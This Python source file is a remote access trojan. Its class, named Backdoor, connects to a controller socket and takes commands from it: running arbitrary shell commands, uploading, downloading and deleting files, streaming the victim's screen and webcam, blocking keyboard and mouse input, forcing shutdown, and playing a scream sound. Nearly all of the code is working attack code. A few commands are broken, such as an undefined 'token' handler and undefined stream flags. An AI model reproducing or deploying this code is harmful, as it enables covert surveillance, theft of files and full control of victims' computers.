import socket
import subprocess
import base64
from colorama import Fore, Back, Style, just_fix_windows_console
from tabulate import tabulate
import locale
import sys
import platform
from vidstream import ScreenShareClient
import threading
import pymsgbox as a
from vidstream import CameraClient
import os
import json
from ctypes import *
from pygame import mixer

just_fix_windows_console()

pl = Fore.GREEN + Style.BRIGHT + '[+]' + Style.RESET_ALL
ne = Fore.RED + Style.BRIGHT + '[-]' + Style.RESET_ALL

info = [
        ["OS", os.name + " " + sys.platform],
        #["Release", os.release()],
        ["Architecture", platform.architecture()],
        ["System Language", locale.getdefaultlocale()],
        ["Users Name", os.getlogin()]
    ]

sender = ScreenShareClient('127.0.0.1', 2121)

#192.168.149.1

camsend = CameraClient('127.0.0.1', 3333)

t1 = threading.Thread(target=camsend.start_stream)

t = threading.Thread(target=sender.start_stream)

streamingVid = False

soundPlaying = False


class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connected = True
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self, data):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(999999)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True), f"{pl} System Command Executed"

    def change_working_directory_to(self, path):
        os.chdir(path)
        return f"{pl} Changing Working Directory To " + path
        print(path)

    def delete(self, path):
        os.remove(path)
        return f"{pl} Deleted " + path

    def msg(self, messa):
        b = a.alert(messa, "title")
        return f"{pl} msg sent successfully "

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return f"{pl} Upload Successful."

    def username(self, command):
        return f"{pl} The Current Users Username is " + os.getlogin()

    def osInfo(self):
        return print(tabulate(info, tablefmt="grid"))

    def streamVideo(self):
        #receiver = StreamingServer('10.0.0.4', 9999)

        t = threading.Thread(target=sender.start_server)
        t.start()
        return f'{pl} Started Streaming Video'

    def shutdown(self):
        return os.system("shutdown /s /t 1")
        command_result = camsend.stop_stream()
        command_result = sender.stop_stream()
        exit()

    def printPaper(self, path):
        os.startfile(path, "print")
        return f"{pl} Successfully Started Printing"

    def freezeInput(self):
        windll.user32.BlockInput(True)
        return f"{pl} Successfully Froze Inputs"

    soundPlaying = False

    def scareSound(self):
        soundPlaying = False
        if soundPlaying == False:
            mixer.init()
            mixer.music.load("scream.mp3")
            mixer.music.set_volume(1)
            mixer.music.play()
            soundPlaying = True
            return f"{pl} Successfully played Scream"
        if soundPlaying == True:
            mixer.init()
            mixer.music.stop()
            soundPlaying = False
            return f"{pl} Successfully stopped Scream"

    def run(self):
        while True:
            command = self.reliable_receive(9999)
            try:
                if command[0] == "exit":
                    if streamopen == True:
                        sender.stop_stream()
                    if camopen == True:
                        camsend.stop_stream()
                    self.connection.close()
                    exit()

                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "msg":
                    command_result = self.msg(command[1])
                elif command[0] == "shutdown":
                    command_result = self.shutdown()
                elif command[0] == "print":
                    command_result = self.printPaper(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "token":
                    command_result = self.main()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                elif command[0] == "username":
                    command_result = "The Current Users Username is " + os.getlogin()
                elif command[0] == "info":
                    command_result = tabulate(info, tablefmt="grid")
                elif command[0] == "freeze":
                    command_result = self.freezeInput(command[1])
                elif command[0] == "soundstart":
                    command_result = self.scareSound()
                elif command[0] == "soundstop":
                    command_result = self.scareSound()
                elif command[0] == "stream":
                    streamopen = True
                    command_result = t.start()
                    streamingVid = True
                elif command[0] == "cam":
                    camopen = True
                    command_result = t1.start()
                elif command[0] == "stopcam":
                    camopen = False
                    command_result = camsend.stop_stream()
                elif command[0] == "stopstream":
                    streamopen = False
                    command_result = sender.stop_stream()
                    streamingVid = False
                else:
                    command_result = self.execute_system_command(command).decode()
            except Exception:
                command_result = Fore.RED + Style.BRIGHT + f"{ne} Error during command execution 1" + Style.RESET_ALL
            self.reliable_send(command_result)

my_backdoor = Backdoor("127.0.0.1", 4444)
my_backdoor.run()
